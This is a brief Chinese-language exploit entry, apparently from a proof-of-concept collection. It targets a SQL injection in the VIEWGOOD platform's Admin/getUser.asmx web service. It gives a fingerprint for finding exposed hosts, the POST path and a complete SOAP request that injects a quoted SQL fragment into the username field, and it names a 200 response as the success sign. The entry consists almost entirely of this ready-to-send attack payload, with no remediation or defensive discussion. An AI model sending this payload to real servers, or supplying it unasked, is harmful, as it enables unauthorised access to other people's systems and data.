# VIEWGOOD-getUser-sql注入漏洞

VIEWGOOD ｜ SQL注入 ｜ —
- **指纹**：`body="VIEWGOOD/pc"`
- **请求**：`POST /VIEWGOOD/Admin/getUser.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<CheckUser xmlns="http://tempuri.org/">
<username>111' and 1=2 --+</username>
<password>2</password>
</CheckUser>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200